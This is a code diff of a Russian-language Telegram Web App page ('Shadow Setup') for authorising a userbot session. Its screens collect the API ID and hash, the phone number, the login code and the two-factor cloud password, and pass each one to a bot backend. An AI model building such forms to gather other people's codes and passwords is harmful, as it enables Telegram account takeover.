@@ -6,44 +6,217 @@
     <title>Shadow Setup</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background-color: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); padding: 20px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background-color: var(--tg-theme-button-color, #3390ec); color: var(--tg-theme-button-text-color, #fff); border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .hidden { display: none; }
+        :root {
+            --bg-color: var(--tg-theme-bg-color, #fff);
+            --text-color: var(--tg-theme-text-color, #000);
+            --btn-color: var(--tg-theme-button-color, #3390ec);
+            --btn-text: var(--tg-theme-button-text-color, #fff);
+            --hint-color: var(--tg-theme-hint-color, #999);
+            --secondary-bg: var(--tg-theme-secondary-bg-color, #f0f0f0);
+        }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: var(--bg-color); 
+            color: var(--text-color); 
+            padding: 20px; 
+            margin: 0; 
+        }
+        
+        .container { display: none; flex-direction: column; gap: 15px; }
+        .active { display: flex; }
+
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid var(--hint-color); 
+            border-radius: 12px; 
+            box-sizing: border-box; 
+            background: transparent; 
+            color: var(--text-color); 
+            font-size: 16px; 
+            outline: none;
+        }
+        
+        input:focus {
+            border-color: var(--btn-color);
+            border-width: 2px;
+            padding: 11px; /* Компенсация толщины рамки */
+        }
+
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background-color: var(--btn-color); 
+            color: var(--btn-text); 
+            border: none; 
+            border-radius: 12px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            font-size: 16px; 
+            margin-top: 10px; 
+        }
+        button:active { opacity: 0.8; }
+        
+        .tabs { 
+            display: flex; 
+            gap: 10px; 
+            margin-bottom: 20px; 
+            background: var(--secondary-bg); 
+            padding: 4px; 
+            border-radius: 12px; 
+        }
+        
+        .tab { 
+            flex: 1; 
+            padding: 10px; 
+            text-align: center; 
+            cursor: pointer; 
+            border-radius: 8px; 
+            font-size: 14px; 
+            font-weight: 500; 
+            color: var(--hint-color); 
+            transition: 0.2s; 
+        }
+        
+        .tab.active-tab { 
+            background: var(--bg-color); 
+            color: var(--text-color); 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+        }
+        
+        .note { 
+            font-size: 13px; 
+            color: var(--hint-color); 
+            text-align: center; 
+            margin-top: 20px; 
+            line-height: 1.4;
+        }
+        
+        h3 { margin: 0 0 10px 0; text-align: center; }
+        p { margin: 0 0 15px 0; text-align: center; color: var(--hint-color); }
     </style>
 </head>
 <body>
-    <h3>Настройка Shadow</h3>
-    <p>Введите данные от my.telegram.org</p>
-    
-    <input type="number" id="api_id" placeholder="API ID">
-    <input type="text" id="api_hash" placeholder="API HASH">
-    <input type="tel" id="phone" placeholder="Номер телефона (+7...)">
-    
-    <button onclick="sendData()">Начать авторизацию</button>
+
+    <!-- ЭКРАН 1: ВХОД (API ID/HASH) -->
+    <div id="screen-login" class="container">
+        <h3>Авторизация</h3>
+        
+        <div class="tabs">
+            <div class="tab active-tab" onclick="switchTab('phone')">По номеру</div>
+            <div class="tab" onclick="switchTab('qr')">По QR коду</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 10px;">
+            <label style="font-size: 12px; color: var(--hint-color); margin-left: 5px;">Данные приложения (my.telegram.org)</label>
+            <input type="number" id="api_id" placeholder="API ID">
+            <input type="text" id="api_hash" placeholder="API HASH">
+        </div>
+        
+        <div id="phone-input-group" style="margin-top: 10px;">
+            <input type="tel" id="phone" placeholder="Номер телефона (+7...)">
+        </div>
+
+        <button onclick="sendInitData()" id="btn-login">Войти</button>
+        <div class="note">
+            Данные используются только для авторизации сессии Userbot и сохраняются локально.
+        </div>
+    </div>
+
+    <!-- ЭКРАН 2: ВВОД КОДА -->
+    <div id="screen-code" class="container">
+        <h3>Подтверждение</h3>
+        <p>Введите код, который пришел вам в Telegram (Service Notifications)</p>
+        <input type="number" id="auth_code" placeholder="1 2 3 4 5" style="letter-spacing: 5px; text-align: center; font-size: 24px; font-weight: bold;">
+        <button onclick="sendCode()">Отправить код</button>
+    </div>
+
+    <!-- ЭКРАН 3: ВВОД ПАРОЛЯ -->
+    <div id="screen-password" class="container">
+        <h3>Облачный пароль</h3>
+        <p>Ваш аккаунт защищен двухфакторной аутентификацией. Введите пароль.</p>
+        <input type="password" id="2fa_pass" placeholder="Ваш пароль">
+        <button onclick="sendPassword()">Отправить пароль</button>
+    </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        function sendData() {
+        // Логика переключения режимов (Телефон / QR)
+        let loginMode = 'phone'; 
+        
+        function switchTab(mode) {
+            loginMode = mode;
+            // Управление стилями табов
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active-tab'));
+            event.target.classList.add('active-tab');
+            
+            const phoneInput = document.getElementById('phone-input-group');
+            const btn = document.getElementById('btn-login');
+            
+            if (mode === 'qr') {
+                phoneInput.style.display = 'none';
+                btn.innerText = "Получить QR код";
+            } else {
+                phoneInput.style.display = 'block';
+                btn.innerText = "Войти";
+            }
+        }
+
+        // Определение, какой экран показывать (Login / Code / Password)
+        // main.py передает параметры ?mode=code или ?mode=password
+        const urlParams = new URLSearchParams(window.location.search);
+        const mode = urlParams.get('mode');
+
+        // Скрываем все экраны
+        document.querySelectorAll('.container').forEach(el => el.classList.remove('active'));
+
+        // Показываем нужный
+        if (mode === 'code') {
+            document.getElementById('screen-code').classList.add('active');
+        } else if (mode === 'password') {
+            document.getElementById('screen-password').classList.add('active');
+        } else {
+            document.getElementById('screen-login').classList.add('active');
+        }
+
+        // --- ФУНКЦИИ ОТПРАВКИ ---
+
+        function sendInitData() {
             const api_id = document.getElementById('api_id').value;
             const api_hash = document.getElementById('api_hash').value;
             const phone = document.getElementById('phone').value;
 
-            if (!api_id || !api_hash || !phone) {
-                tg.showAlert("Заполните все поля!");
+            if (!api_id || !api_hash) {
+                tg.showAlert("Пожалуйста, заполните API ID и API HASH!");
+                return;
+            }
+            
+            if (loginMode === 'phone' && !phone) {
+                tg.showAlert("Пожалуйста, введите номер телефона!");
                 return;
             }
 
-            const data = JSON.stringify({
-                action: "init_auth",
+            const data = {
+                action: loginMode === 'phone' ? "init_phone" : "init_qr",
                 api_id: api_id,
                 api_hash: api_hash,
-                phone: phone
-            });
+                phone: loginMode === 'phone' ? phone : null
+            };
+            tg.sendData(JSON.stringify(data));
+        }
 
-            tg.sendData(data);
+        function sendCode() {
+            const code = document.getElementById('auth_code').value;
+            if (!code) return tg.showAlert("Введите код!");
+            tg.sendData(JSON.stringify({ action: "submit_code", code: code }));
+        }
+
+        function sendPassword() {
+            const pass = document.getElementById('2fa_pass').value;
+            if (!pass) return tg.showAlert("Введите пароль!");
+            tg.sendData(JSON.stringify({ action: "submit_password", password: pass }));
         }
     </script>
 </body>
